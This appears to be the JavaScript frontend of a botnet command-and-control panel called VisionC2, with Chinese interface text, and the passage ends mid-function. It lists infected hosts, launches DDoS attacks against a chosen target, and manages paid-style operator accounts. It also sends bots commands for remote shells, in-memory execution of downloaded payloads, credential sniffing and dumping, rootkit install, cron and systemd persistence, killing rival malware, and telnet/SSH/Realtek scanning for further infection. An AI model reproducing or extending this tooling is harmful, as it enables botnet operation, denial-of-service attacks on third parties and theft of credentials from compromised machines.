/* ============================================================================
   VisionC2 Tactical Command Center — Core Frontend Application Logic
   ============================================================================ */

var botState = {};
var botOrder = [];
var selectedBots = {};
var currentCtxBotID = null;

var countryCoords = {
  'SG': [1.3521, 103.8198], 'ES': [40.4168, -3.7038], 'US': [37.0902, -95.7129],
  'CN': [35.8617, 104.1954], 'JP': [36.2048, 138.2529], 'DE': [51.1657, 10.4515],
  'GB': [55.3781, -3.4360], 'FR': [46.2276, 2.2137], 'RU': [61.5240, 105.3188],
  'KR': [35.9078, 127.7669], 'IN': [20.5937, 78.9629], 'BR': [-14.2350, -51.9253],
  'AU': [-25.2744, 133.7751], 'CA': [56.1304, -106.3468], 'NL': [52.1326, 5.2913],
  'HK': [22.3193, 114.1694], 'TW': [23.6978, 120.9605], 'IT': [41.8719, 12.5674],
  'SE': [60.1282, 18.6435], 'FI': [61.9241, 25.7482], 'IE': [53.1424, -7.6921],
  'ZA': [-30.5595, 22.9375], 'AE': [23.4241, 53.8478], 'RO': [45.9432, 24.9668],
  'PL': [51.9194, 19.1451], 'UA': [48.3794, 31.1656], 'LO': [37.0902, -95.7129],
  '??': [37.0902, -95.7129]
};

var globalMap = null;
var fullMap = null;
var mapMarkers = {};
var fullMapMarkers = {};

// ---------------------------------------------------------------------------
// Navigation Section Switching
// ---------------------------------------------------------------------------
function switchSection(secId) {
  document.querySelectorAll('.nav-item').forEach(function (el) { el.classList.remove('active'); });
  document.querySelectorAll('.view-section').forEach(function (el) { el.classList.remove('active'); });

  var navEl = document.getElementById('nav-' + secId);
  var secEl = document.getElementById('sec-' + secId);

  if (navEl) navEl.classList.add('active');
  if (secEl) secEl.classList.add('active');

  if (secId === 'map') {
    initFullMap();
  } else if (secId === 'tools') {
    loadScanResults();
  } else if (secId === 'attack') {
    loadRunningAttacks();
  } else if (secId === 'settings') {
    loadUsers();
  } else if (secId === 'socks') {
    if (window._botsArr) updateProxies(window._botsArr);
  }
}

// ---------------------------------------------------------------------------
// Data Polling & Real-time Updates
// ---------------------------------------------------------------------------
function startPolling() {
  setInterval(function () {
    fetch('/api/stats').then(function (r) { return r.json(); }).then(updateStats).catch(function () {});
    fetch('/api/bots').then(function (r) { return r.json(); }).then(updateBots).catch(function () {});
    fetch('/api/activity').then(function (r) { return r.json(); }).then(renderActivity).catch(function () {});
  }, 4000);
}

function refreshAll() {
  fetch('/api/stats').then(function (r) { return r.json(); }).then(updateStats);
  fetch('/api/bots').then(function (r) { return r.json(); }).then(updateBots);
}

function updateStats(d) {
  document.getElementById('s-bots').textContent = d.botCount || 0;
  document.getElementById('s-bots-main').textContent = d.botCount || 0;
  document.getElementById('badge-bots').textContent = d.botCount || 0;
  document.getElementById('s-ram').textContent = formatRAM(d.totalRAM || 0);
  document.getElementById('s-ram-main').textContent = formatRAM(d.totalRAM || 0);
  document.getElementById('s-cpu').textContent = (d.totalCPU || 0) + '核';
  document.getElementById('s-cpu-main').textContent = (d.totalCPU || 0) + ' 核';
  document.getElementById('s-uptime').textContent = d.uptime || '0h';
  document.getElementById('s-uptime-main').textContent = d.uptime || '0h';
}

function formatRAM(mb) {
  if (mb >= 1024) return (mb / 1024).toFixed(1) + ' GB';
  return mb + ' MB';
}

function updateBots(bots) {
  if (!bots) return;
  window._botsArr = bots;
  var tbody = document.getElementById('bot-tbody');
  if (!bots.length) {
    tbody.innerHTML = '<tr><td colspan="10" style="text-align:center;padding:24px;color:var(--text-dim)">暂无在线受控端...</td></tr>';
    return;
  }

  var html = '';
  bots.forEach(function (b) {
    botState[b.botID] = b;
    var caps = '';
    if (b.caps) {
      if (b.caps.indexOf('A') !== -1) caps += '<span class="cap-badge">ATK</span>';
      if (b.caps.indexOf('S') !== -1) caps += '<span class="cap-badge purple">SOCKS</span>';
      if (b.caps.indexOf('N') !== -1) caps += '<span class="cap-badge">SNIFF</span>';
      if (b.caps.indexOf('C') !== -1) caps += '<span class="cap-badge purple">SCAN</span>';
      if (b.caps.indexOf('R') !== -1) caps += '<span class="cap-badge">RTKT</span>';
    } else {
      // Backwards compat: bots that predate the caps field expose booleans only.
      if (b.attacksEnabled) caps += '<span class="cap-badge">ATK</span>';
      if (b.socksEnabled) caps += '<span class="cap-badge purple">SOCKS</span>';
      if (b.snifferEnabled) caps += '<span class="cap-badge">SNIFF</span>';
      if (b.scannerEnabled) caps += '<span class="cap-badge purple">SCAN</span>';
      if (b.rootkitEnabled) caps += '<span class="cap-badge">RTKT</span>';
    }

    html += '<tr oncontextmenu="openContextMenu(event, \'' + b.botID + '\')">' +
      '<td><input type="checkbox" class="bot-chk" data-id="' + b.botID + '"></td>' +
      '<td style="font-weight:700;color:var(--accent)">' + escHtml(b.botID) + '</td>' +
      '<td>' + escHtml(b.ip) + '</td>' +
      '<td><span class="cap-badge">' + escHtml(b.country || 'US') + '</span></td>' +
      '<td style="font-weight:600;color:var(--text)">' + escHtml(b.processName || '-') + '</td>' +
      '<td>' + escHtml(b.arch) + '</td>' +
      '<td>' + b.ram + ' MB</td>' +
      '<td>' + b.cpuCores + ' 核</td>' +
      '<td>' + (caps || '-') + '</td>' +
      '<td style="color:var(--green)">在线 (' + (b.lastSeen || '刚刚') + ')</td>' +
      '<td>' +
      '<button class="cmd-cat-btn" onclick="openShell(\'' + b.botID + '\')">PTY</button> ' +
      '<button class="cmd-cat-btn" style="background:var(--red-dim);color:var(--red)" onclick="popupCmd(\'' + b.botID + '\', \'!kill\')">销毁</button>' +
      '</td>' +
      '</tr>';
  });

  tbody.innerHTML = html;
  renderTopCountries(bots);
  updateGlobalMap(bots);
  updateProxies(bots);
}

function renderTopCountries(bots) {
  var counts = {};
  bots.forEach(function (b) {
    var c = b.country || 'US';
    counts[c] = (counts[c] || 0) + 1;
  });

  var arr = Object.keys(counts).map(function (k) { return { country: k, count: counts[k] }; });
  arr.sort(function (a, b) { return b.count - a.count; });

  var wrap = document.getElementById('top-countries-list');
  if (!arr.length) { wrap.innerHTML = '<div style="color:var(--text-dim);font-size:12px;padding:12px 0">无节点数据...</div>'; return; }

  var total = bots.length || 1;
  var html = '';
  arr.slice(0, 5).forEach(function (item) {
    var pct = Math.round((item.count / total) * 100);
    html += '<div class="country-row">' +
      '<span style="font-weight:700;min-width:30px">' + escHtml(item.country) + '</span>' +
      '<div class="country-bar-wrap"><div class="country-bar-fill" style="width:' + pct + '%"></div></div>' +
      '<span class="country-count">' + item.count + '</span>' +
      '</div>';
  });
  wrap.innerHTML = html;
}

// ---------------------------------------------------------------------------
// Attack Hub API Handler
// ---------------------------------------------------------------------------
function launchAttack() {
  var method = document.getElementById('atk-method').value;
  var target = document.getElementById('atk-target').value.trim();
  var port = document.getElementById('atk-port').value.trim();
  var duration = document.getElementById('atk-duration').value.trim();

  if (!target) { alert('请输入目标 IP 或域名'); return; }

  var cmdStr = '!' + method + ' ' + target + ' ' + (port || '80') + ' ' + (duration || '60');
  sendBroadCmd(cmdStr);
  setTimeout(loadRunningAttacks, 1000);
}

function stopAllAttacks() {
  sendBroadCmd('!stop');
  setTimeout(loadRunningAttacks, 1000);
}

function loadRunningAttacks() {
  fetch('/api/attacks').then(function (r) { return r.json(); }).then(function (attacks) {
    var tbody = document.getElementById('attacks-tbody');
    if (!attacks || !attacks.length) {
      tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;padding:20px;color:var(--text-dim)">暂无进行中的攻击任务</td></tr>';
      return;
    }

    var html = '';
    attacks.forEach(function (a) {
      html += '<tr>' +
        '<td><span class="cap-badge purple">' + escHtml(a.method) + '</span></td>' +
        '<td style="font-weight:700">' + escHtml(a.target) + '</td>' +
        '<td>' + (a.port || 80) + '</td>' +
        '<td>' + a.duration + 's</td>' +
        '<td>' + a.elapsed + 's</td>' +
        '<td style="color:var(--green)">' + a.remaining + 's</td>' +
        '<td><button class="cmd-cat-btn" style="background:var(--red-dim);color:var(--red)" onclick="sendBroadCmd(\'!stop\')">停止</button></td>' +
        '</tr>';
    });
    tbody.innerHTML = html;
  }).catch(function () {});
}

// ---------------------------------------------------------------------------
// User Management API Handler
// ---------------------------------------------------------------------------
function loadUsers() {
  fetch('/api/users').then(function (r) { return r.json(); }).then(function (users) {
    var tbody = document.getElementById('users-tbody');
    if (!users || !users.length) {
      tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;padding:20px;color:var(--text-dim)">暂无用户账号</td></tr>';
      return;
    }

    var html = '';
    users.forEach(function (u) {
      html += '<tr>' +
        '<td style="font-weight:700;color:var(--accent)">' + escHtml(u.username) + '</td>' +
        '<td><span class="cap-badge">' + escHtml(u.level) + '</span></td>' +
        '<td>' + u.maxtime + 's</td>' +
        '<td>' + u.concurrents + '</td>' +
        '<td>' + (u.maxbots || '无限制') + '</td>' +
        '<td style="font-family:var(--mono);font-size:11px">' + escHtml(u.api_key || '-') + '</td>' +
        '<td><button class="cmd-cat-btn" style="background:var(--red-dim);color:var(--red)" onclick="deleteUser(\'' + escHtml(u.username) + '\')">删除</button></td>' +
        '</tr>';
    });
    tbody.innerHTML = html;
  }).catch(function () {
    var tbody = document.getElementById('users-tbody');
    if (tbody) tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;padding:20px;color:var(--text-dim)">权限不足 (需 Owner 权限)</td></tr>';
  });
}

function createNewUser() {
  var u = document.getElementById('nu-user').value.trim();
  var p = document.getElementById('nu-pass').value.trim();
  var lvl = document.getElementById('nu-level').value;
  var maxtime = parseInt(document.getElementById('nu-maxtime').value) || 300;
  var conc = parseInt(document.getElementById('nu-concurrents').value) || 5;

  if (!u || !p) { alert('请输入用户名和密码'); return; }

  fetch('/api/users', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: u, password: p, level: lvl, maxtime: maxtime, concurrents: conc })
  }).then(function (r) { return r.json(); }).then(function (d) {
    if (d.success) {
      alert('用户创建成功');
      loadUsers();
    } else {
      alert(d.error || '创建用户失败');
    }
  });
}

function deleteUser(username) {
  if (!confirm('确定删除用户 ' + username + '？')) return;
  fetch('/api/users?username=' + encodeURIComponent(username), { method: 'DELETE' })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d && d.error) { alert(d.error); }
      loadUsers();
    }).catch(function () { loadUsers(); });
}

// ---------------------------------------------------------------------------
// Command Dispatching & Output Console
// ---------------------------------------------------------------------------
function logConsoleMsg(msg, isSuccess) {
  var body = document.getElementById('cmd-console-body');
  if (!body) return;
  if (body.textContent.indexOf('[系统就绪]') !== -1) {
    body.textContent = '';
  }
  var time = new Date().toLocaleTimeString();
  var color = isSuccess === false ? '#ff4d4f' : (isSuccess === true ? '#00ff66' : '#58a6ff');
  body.innerHTML += '<div style="margin-bottom:4px"><span style="color:#666">[' + time + ']</span> <span style="color:' + color + '">' + escHtml(msg) + '</span></div>';
  body.scrollTop = body.scrollHeight;
}

function clearCmdConsole() {
  var body = document.getElementById('cmd-console-body');
  if (body) body.textContent = '[系统就绪] 动态控制台已清空...';
}

function updateArgFields() {
  var typ = document.getElementById('cmd-type').value;
  var wrap = document.getElementById('arg-fields');
  var html = '';
  if (typ === '!shell') {
    html = '<input type="text" id="arg-cmd" placeholder="Shell 命令 (如 whoami, ls -la)" class="cmd-input-field" style="flex:1">';
  } else if (typ === '!memexec') {
    html = '<input type="text" id="arg-url" placeholder="ELF 下载 URL (如 http://x.x.x.x/payload)" class="cmd-input-field" style="flex:1">';
  } else if (typ === '!memexecb64') {
    html = '<input type="text" id="arg-b64" placeholder="Base64 加密 ELF 二进制数据" class="cmd-input-field" style="flex:1">';
  } else if (typ === '!portscan') {
    html = '<input type="text" id="arg-target" placeholder="目标 IP / CIDR" class="cmd-input-field"><input type="text" id="arg-ports" placeholder="端口 22,80,443" value="22,80,443" class="cmd-input-field">';
  } else if (typ === '!portfwd') {
    html = '<input type="text" id="arg-lport" placeholder="本地监听端口 (如 8080)" class="cmd-input-field">' +
           '<input type="text" id="arg-rhost" placeholder="目标 IP (如 127.0.0.1)" class="cmd-input-field">' +
           '<input type="text" id="arg-rport" placeholder="目标端口 (如 80)" class="cmd-input-field">';
  } else if (typ === '!socks') {
    html = '<input type="text" id="arg-sport" placeholder="SOCKS5 代理端口 (留空默认 1080)" class="cmd-input-field" style="flex:1">';
  } else if (typ === '!reinstall') {
    html = '<input type="text" id="arg-rurl" placeholder="新 Bot 二进制或 Loader 下载 URL (如 http://x.x.x.x/bins/kworker_u8)" class="cmd-input-field" style="flex:1">';
  } else if (typ === '!persist') {
    html = '<input type="text" id="arg-purl" placeholder="备用 Payload 下载 URL (可选，留空则复制运行中的 Bot 二进制)" class="cmd-input-field" style="flex:1">';
  } else if (typ === '!sniffer') {
    html = '<select id="arg-subact" class="cmd-select" style="min-width:130px">' +
           '<option value="start">start (启动嗅探)</option>' +
           '<option value="dump">dump (导出凭据)</option>' +
           '<option value="stop">stop (停止嗅探)</option>' +
           '</select>' +
           '<input type="text" id="arg-iface" placeholder="网卡名 (如 eth0，留空自动检测)" class="cmd-input-field" style="flex:1">';
  } else if (typ === '!rootkit') {
    html = '<select id="arg-subact" class="cmd-select" style="min-width:130px">' +
           '<option value="status">status (检测状态)</option>' +
           '<option value="install">install (安装隐藏)</option>' +
           '<option value="remove">remove (卸载隐藏)</option>' +
           '</select>';
  } else if (typ === '!killer') {
    html = '<select id="arg-subact" class="cmd-select" style="min-width:130px">' +
           '<option value="scan">scan (扫除竞品进程)</option>' +
           '<option value="start">start (启动杀手守护)</option>' +
           '<option value="stop">stop (停止杀手守护)</option>' +
           '</select>';
  } else if (typ === '!telnet_scan' || typ === '!ssh_scan' || typ === '!realtek_scan') {
    html = '<input type="text" id="arg-cidr" placeholder="目标 CIDR 网段 (如 192.168.1.0/24) 或 auto" class="cmd-input-field" style="flex:1">' +
           '<input type="text" id="arg-payload" placeholder="Payload URL (可选，如 http://bins.example.com/x.sh)" class="cmd-input-field" style="flex:1">';
  }
  wrap.innerHTML = html;
}

function sendCmd() {
  var typ = document.getElementById('cmd-type').value;
  var botID = document.getElementById('cmd-bot').value.trim();
  var command = typ;

  if (typ === '!shell') {
    var c = (document.getElementById('arg-cmd') || {}).value || '';
    if (!c) { alert('请输入命令'); return; }
    command += ' ' + c;
  } else if (typ === '!memexec') {
    var u = (document.getElementById('arg-url') || {}).value || '';
    if (!u) { alert('请输入 URL'); return; }
    command += ' ' + u;
  } else if (typ === '!memexecb64') {
    var b = (document.getElementById('arg-b64') || {}).value || '';
    if (!b) { alert('请输入 Base64 数据'); return; }
    command += ' ' + b;
  } else if (typ === '!portscan') {
    var t = (document.getElementById('arg-target') || {}).value || '';
    var p = (document.getElementById('arg-ports') || {}).value || '22,80,443';
    command += ' ' + t + ' ' + p + ' 1000';
  } else if (typ === '!portfwd') {
    var lp = (document.getElementById('arg-lport') || {}).value || '';
    var rh = (document.getElementById('arg-rhost') || {}).value || '';
    var rp = (document.getElementById('arg-rport') || {}).value || '';
    if (!lp || !rh || !rp) { alert('请完整填写本地端口、远程IP及远程端口'); return; }
    command += ' ' + lp + ' ' + rh + ' ' + rp;
  } else if (typ === '!socks') {
    var sp = (document.getElementById('arg-sport') || {}).value || '';
    if (sp) command += ' ' + sp;
  } else if (typ === '!reinstall') {
    var rurl = (document.getElementById('arg-rurl') || {}).value || '';
    if (!rurl) { alert('请输入新 Payload 的下载 URL'); return; }
    command += ' ' + rurl;
  } else if (typ === '!persist') {
    var purl = (document.getElementById('arg-purl') || {}).value || '';
    if (purl) command += ' ' + purl;
  } else if (typ === '!sniffer') {
    var sub = (document.getElementById('arg-subact') || {}).value || 'start';
    var iface = (document.getElementById('arg-iface') || {}).value || '';
    command += ' ' + sub + (iface ? (' ' + iface.trim()) : '');
  } else if (typ === '!rootkit' || typ === '!killer') {
    var sub = (document.getElementById('arg-subact') || {}).value || 'status';
    command += ' ' + sub;
  } else if (typ === '!telnet_scan' || typ === '!ssh_scan' || typ === '!realtek_scan') {
    var cidr = (document.getElementById('arg-cidr') || {}).value || '';
    if (!cidr) { alert('请输入目标 CIDR 网段或 auto'); return; }
    command += ' ' + cidr.trim();
    var payload = (document.getElementById('arg-payload') || {}).value || '';
    if (payload) command += ' ' + payload.trim();
  }

  logConsoleMsg('-> 发送指令: ' + command + (botID ? (' (目标: ' + botID + ')') : ' (全广播)'), null);

  fetch('/api/command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ command: command, botID: botID })
  }).then(function (r) { return r.json(); }).then(function (d) {
    if (d.success) {
      logConsoleMsg('⚡ C2 投递确认: ' + d.message + ' (等待受控端异步回传输出...)', true);
    } else {
      logConsoleMsg('<- C2 投递失败: ' + (d.message || d.error), false);
    }
  }).catch(function (err) {
    logConsoleMsg('<- 网络请求异常: ' + err.message, false);
  });
}

function sendBroadCmd(cmdStr) {
  logConsoleMsg('-> 广播全局指令: ' + cmdStr, null);
  fetch('/api/command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ command: cmdStr, botID: '' })
  }).then(function (r) { return r.json(); }).then(function (d) {
    if (d.success) {
      logConsoleMsg('⚡ C2 广播投递确认: ' + d.message + ' (等待受控端异步回传输出...)', true);
    } else {
      logConsoleMsg('<- C2 广播失败: ' + (d.message || d.error), false);
    }
  }).catch(function (err) {
    logConsoleMsg('<- 网络请求异常: ' + err.message, false);
  });
}

function startScannerCmd(cmdName, inputId) {
  var cidr = (document.getElementById(inputId) || {}).value || '';
  if (!cidr) { alert('请输入目标 CIDR'); return; }
  sendBroadCmd(cmdName + ' ' + cidr.trim());
}

function stopScannerCmd() {
  sendBroadCmd('!stop_scan');
}

function startPortScanCmd() {
  var t = (document.getElementById('scan-ps-target') || {}).value || '';
  var p = (document.getElementById('scan-ps-ports') || {}).value || '';
  if (!t || !p) { alert('请输入目标 IP 和端口'); return; }
  sendBroadCmd('!portscan ' + t.trim() + ' ' + p.trim() + ' 1000');
}

function stopPortScanCmd() {
  sendBroadCmd('!portscanstop');
}

function startSnifferCmd() {
  var iface = (document.getElementById('sniff-iface') || {}).value || '';
  sendBroadCmd('!sniffer start' + (iface.trim() ? (' ' + iface.trim()) : ''));
}

function startPersistCmd() {
  var url = (document.getElementById('persist-url') || {}).value || '';
  sendBroadCmd('!persist' + (url.trim() ? (' ' + url.trim()) : ''));
}

function popupCmd(botID, cmd) {
  logConsoleMsg('-> 下发指令到 [' + botID + ']: ' + cmd, null);
  fetch('/api/command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ command: cmd, botID: botID })
  }).then(function (r) { return r.json(); }).then(function (d) {
    if (d.success) {
      logConsoleMsg('⚡ C2 投递确认 [' + botID + ']: ' + d.message, true);
    } else {
      logConsoleMsg('<- [' + botID + '] 投递失败: ' + (d.message || d.error), false);
    }
  }).catch(function (err) {
    logConsoleMsg('<- [' + botID + '] 请求失败: ' + err.message, false);
  });
}

function logConsoleBotOutput(botID, output, timestamp) {
  var body = document.getElementById('cmd-console-body');
  if (!body) return;
  if (body.textContent.indexOf('[系统就绪]') !== -1) {
    body.textContent = '';
  }
  var time = timestamp || new Date().toLocaleTimeString();
  var html = '<div style="margin-bottom:6px;border-left:3px solid #00ff66;padding-left:8px;background:rgba(0,255,102,0.03);padding-top:4px;padding-bottom:4px;border-radius:0 4px 4px 0">' +
    '<div><span style="color:#666">[' + time + ']</span> <span style="color:#00ff66;font-weight:700"><- Bot [' + escHtml(botID) + '] 真实执行结果:</span></div>' +
    '<div style="color:#e6edf3;white-space:pre-wrap;word-break:break-all;margin-top:2px;padding:4px 8px;background:#050505;border:1px solid #1f293d;border-radius:4px;font-family:var(--mono)">' + escHtml(output) + '</div>' +
    '</div>';
  body.innerHTML += html;
  body.scrollTop = body.scrollHeight;
}

var activeWS = null;

function openShell(botID) {
  switchSection('terminal');
  var wrap = document.getElementById('pty-terminal-wrap');
  if (!wrap) return;

  if (activeWS) {
    try { activeWS.close(); } catch (e) {}
    activeWS = null;
  }

  wrap.innerHTML = '<div style="display:flex;justify-content:space-between;align-items:center;padding-bottom:10px;border-bottom:1px solid #333;margin-bottom:10px">' +
    '<div style="color:var(--accent);font-weight:700">💻 PTY 交互会话 —— 受控端: ' + escHtml(botID) + '</div>' +
    '<div id="term-status" style="color:var(--green);font-size:12px">● 正在连接...</div>' +
    '</div>' +
    '<div id="term-output" style="height:380px;overflow-y:auto;background:#050505;color:#00ff66;font-family:var(--mono);font-size:13px;padding:12px;border-radius:6px;white-space:pre-wrap;word-break:break-all"></div>' +
    '<div style="display:flex;gap:8px;margin-top:12px">' +
    '<span style="color:#00ff66;font-family:var(--mono);line-height:36px;font-weight:700">$</span>' +
    '<input type="text" id="term-input" placeholder="输入 Shell 命令 (按 Enter 发送)..." class="cmd-input-field" style="flex:1;background:#111;color:#fff;font-family:var(--mono)">' +
    '<button class="cmd-submit-btn" onclick="sendTermInput()">发送</button>' +
    '</div>';

  var outputEl = document.getElementById('term-output');
  var statusEl = document.getElementById('term-status');
  var inputEl = document.getElementById('term-input');

  function appendOutput(txt) {
    if (!outputEl) return;
    outputEl.textContent += txt;
    outputEl.scrollTop = outputEl.scrollHeight;
  }

  inputEl.addEventListener('keydown', function (e) {
    if (e.key === 'Enter') {
      sendTermInput();
    }
  });

  var wsProto = location.protocol === 'https:' ? 'wss:' : 'ws:';
  var wsUrl = wsProto + '//' + location.host + '/ws/shell?botID=' + encodeURIComponent(botID);

  try {
    activeWS = new WebSocket(wsUrl);
    activeWS.onopen = function () {
      if (statusEl) { statusEl.textContent = '● 已连接 (WebSocket)'; statusEl.style.color = 'var(--green)'; }
      appendOutput('[系统消息] 成功建立与受控端 [' + botID + '] 的交互式 WebSocket 终端通道...\n');
      inputEl.focus();
    };

    activeWS.onmessage = function (evt) {
      try {
        var msg = JSON.parse(evt.data);
        if (msg.type === 'output' && msg.output) {
          appendOutput(msg.output);
        } else if (msg.type === 'file') {
          appendOutput('\n[系统消息] 收到文件: ' + (msg.name || 'file') + '\n');
        }
      } catch (e) {
        appendOutput(evt.data);
      }
    };

    activeWS.onerror = function () {
      if (statusEl) { statusEl.textContent = '● 连接异常'; statusEl.style.color = 'var(--red)'; }
      appendOutput('\n[系统消息] WebSocket 连接发生错误\n');
    };

    activeWS.onclose = function () {
      if (statusEl) { statusEl.textContent = '● 会话已关闭'; statusEl.style.color = '#888'; }
      appendOutput('\n[系统消息] WebSocket 终端会话已断开\n');
    };
  } catch (err) {
    appendOutput('\n[系统消息] 创建 WebSocket 失败: ' + err.message + '\n');
  }
}

function sendTermInput() {
  var inputEl = document.getElementById('term-input');
  var outputEl = document.getElementById('term-output');
  if (!inputEl || !activeWS || activeWS.readyState !== WebSocket.OPEN) {
    if (outputEl) outputEl.textContent += '[系统消息] 终端未连接，无法下发命令\n';
    return;
  }
  var cmd = inputEl.value;
  if (!cmd) return;
  inputEl.value = '';
  outputEl.textContent += '$ ' + cmd + '\n';
  outputEl.scrollTop = outputEl.scrollHeight;
  activeWS.send(JSON.stringify({ command: cmd }));
}

// ---------------------------------------------------------------------------
// Right-Click Context Menu
// ---------------------------------------------------------------------------
function openContextMenu(e, botID) {
  e.preventDefault();
  currentCtxBotID = botID;
  var menu = document.getElementById('bot-ctx-menu');
  if (!menu) return;

  menu.style.display = 'block';
  menu.style.position = 'fixed';
  menu.style.zIndex = '99999';

  var menuWidth = menu.offsetWidth || 180;
  var menuHeight = menu.offsetHeight || 220;
  var winWidth = window.innerWidth || document.documentElement.clientWidth;
  var winHeight = window.innerHeight || document.documentElement.clientHeight;

  var left = e.clientX;
  var top = e.clientY;

  if (top + menuHeight > winHeight) {
    top = Math.max(10, top - menuHeight);
  }
  if (left + menuWidth > winWidth) {
    left = Math.max(10, left - menuWidth);
  }

  menu.style.left = left + 'px';
  menu.style.top = top + 'px';
}

function showModal(title, bodyHTML, onSubmit) {
  var overlay = document.getElementById('action-modal');
  var titleEl = document.getElementById('modal-title');
  var bodyEl = document.getElementById('modal-body');
  var btn = document.getElementById('modal-submit-btn');

  if (!overlay || !titleEl || !bodyEl || !btn) return;

  titleEl.textContent = title;
  bodyEl.innerHTML = bodyHTML;
  overlay.style.display = 'flex';

  btn.onclick = function () {
    if (onSubmit()) {
      closeModal();
    }
  };
}

function closeModal() {
  var overlay = document.getElementById('action-modal');
  if (overlay) overlay.style.display = 'none';
}

function ctxAction(act) {
  document.getElementById('bot-ctx-menu').style.display = 'none';
  if (!currentCtxBotID) return;

  if (act === 'pty') {
    openShell(currentCtxBotID);
  } else if (act === 'portscan') {
    showModal('🔍 内网端口扫描配置 (' + currentCtxBotID + ')',
      '<label style="display:block;font-size:12px;color:#888;margin-bottom:4px">扫描目标 IP 或 CIDR 网段:</label>' +
      '<input type="text" id="m-ps-target" value="192.168.1.0/24" class="cmd-input-field" style="width:100%;margin-bottom:12px">' +
      '<label style="display:block;font-size:12px;color:#888;margin-bottom:4px">目标 TCP 端口列表 (逗号分隔):</label>' +
      '<input type="text" id="m-ps-ports" value="22,80,443,3389,8080" class="cmd-input-field" style="width:100%">',
      function () {
        var t = document.getElementById('m-ps-target').value.trim();
        var p = document.getElementById('m-ps-ports').value.trim();
        if (!t || !p) { alert('请填写完整的目标和端口'); return false; }
        popupCmd(currentCtxBotID, '!portscan ' + t + ' ' + p + ' 1000');
        return true;
      }
    );
  } else if (act === 'portfwd') {
    showModal('⚡ 创建 TCP 端口转发 (' + currentCtxBotID + ')',
      '<label style="display:block;font-size:12px;color:#888;margin-bottom:4px">受控端本地监听端口 (Local Port):</label>' +
      '<input type="number" id="m-pf-lport" placeholder="例如 8080" value="8080" class="cmd-input-field" style="width:100%;margin-bottom:12px">' +
      '<label style="display:block;font-size:12px;color:#888;margin-bottom:4px">转发目标主机 IP (Remote Host):</label>' +
      '<input type="text" id="m-pf-rhost" placeholder="例如 127.0.0.1 或 192.168.1.100" value="127.0.0.1" class="cmd-input-field" style="width:100%;margin-bottom:12px">' +
      '<label style="display:block;font-size:12px;color:#888;margin-bottom:4px">转发目标端口 (Remote Port):</label>' +
      '<input type="number" id="m-pf-rport" placeholder="例如 80" value="80" class="cmd-input-field" style="width:100%">',
      function () {
        var lp = document.getElementById('m-pf-lport').value.trim();
        var rh = document.getElementById('m-pf-rhost').value.trim();
        var rp = document.getElementById('m-pf-rport').value.trim();
        if (!lp || !rh || !rp) { alert('请完整填写所有端口和IP字段'); return false; }
        popupCmd(currentCtxBotID, '!portfwd ' + lp + ' ' + rh + ' ' + rp);
        return true;
      }
    );
  } else if (act === 'rootkit') {
    showModal('🛡️ Rootkit 模块管理 (' + currentCtxBotID + ')',
      '<label style="display:block;font-size:12px;color:#888;margin-bottom:8px">请选择对受控端执行的 Rootkit 操作:</label>' +
      '<select id="m-rk-action" class="cmd-select" style="width:100%">' +
      '<option value="!rootkit status">检查 Rootkit 运行状态</option>' +
      '<option value="!rootkit install">编译并安装 LD_PRELOAD Rootkit</option>' +
      '<option value="!rootkit remove">卸载并清除 Rootkit 痕迹</option>' +
      '</select>',
      function () {
        var cmd = document.getElementById('m-rk-action').value;
        popupCmd(currentCtxBotID, cmd);
        return true;
      }
    );
  } else if (act === 'persist') {
    showModal('📌 安装深度持久化驻留 (' + currentCtxBotID + ')',
      '<label style="display:block;font-size:12px;color:#888;margin-bottom:4px">备用 Payload 下载 URL (可选):</label>' +
      '<input type="text" id="m-pe-url" placeholder="留空默认直接复制当前运行的 Bot 二进制文件" class="cmd-input-field" style="width:100%;margin-bottom:12px">' +
      '<div style="font-size:11px;color:var(--text-dim);line-height:1.5">说明: 将在受控端创建隐藏目录、复制二进制，并安装看门狗 Cron 及 systemd 自动重启服务。</div>',
      function () {
        var u = document.getElementById('m-pe-url').value.trim();
        var cmd = '!persist' + (u ? (' ' + u) : '');
        popupCmd(currentCtxBotID, cmd);
        return true;
      }
    );
  } else if (act === 'update') {
    showModal('🔄 远程更新受控端 (' + currentCtxBotID + ')',
      '<label style="display:block;font-size:12px;color:#888;margin-bottom:4px">新版 Bot 二进制或 Loader 下载 URL:</label>' +
      '<input type="text" id="m-up-url" placeholder="例如 http://your-c2-ip/bins/kworker_u8 或 loader.sh" class="cmd-input-field" style="width:100%;margin-bottom:12px">' +
      '<div style="font-size:11px;color:var(--text-dim);line-height:1.5">说明: 受控端将通过网络下载最新 Payload，保存在临时目录后使用 syscall.Exec 替换当前进程。</div>',
      function () {
        var u = document.getElementById('m-up-url').value.trim();
        if (!u) { alert('请填写有效的新 Payload 下载 URL'); return false; }
        popupCmd(currentCtxBotID, '!reinstall ' + u);
        return true;
      }
    );
  } else if (act === 'kill') {
    if (confirm('确定销毁受控端 ' + currentCtxBotID + '？此操作不可逆！')) popupCmd(currentCtxBotID, '!kill');
  }
}

document.addEventListener('click', function (e) {
  var menu = document.getElementById('bot-ctx-menu');
  if (menu && !menu.contains(e.target)) {
    menu.style.display = 'none';
  }
});

// ---------------------------------------------------------------------------
// Global Geo Map Logic (Esri Dark Canvas + OpenStreetMap Fallback)
// ---------------------------------------------------------------------------
function initGlobalMap() {
  var c = document.getElementById('map-container');
  if (!c || globalMap) return;
  if (typeof L !== 'undefined') {
    try {
      globalMap = L.map('map-container', { center: [20, 0], zoom: 2, zoomControl: false, attributionControl: false });
      // Esri World Dark Gray Canvas Tile Layer (No API Key Required)
      L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/Canvas/World_Dark_Gray_Base/MapServer/tile/{z}/{y}/{x}', {
        maxZoom: 16
      }).addTo(globalMap);
    } catch (e) {}
  }
}

function initFullMap() {
  var c = document.getElementById('full-map-container');
  if (!c || fullMap) return;
  if (typeof L !== 'undefined') {
    try {
      fullMap = L.map('full-map-container', { center: [20, 0], zoom: 2, zoomControl: true, attributionControl: false });
      // Esri World Dark Gray Canvas Tile Layer (No API Key Required)
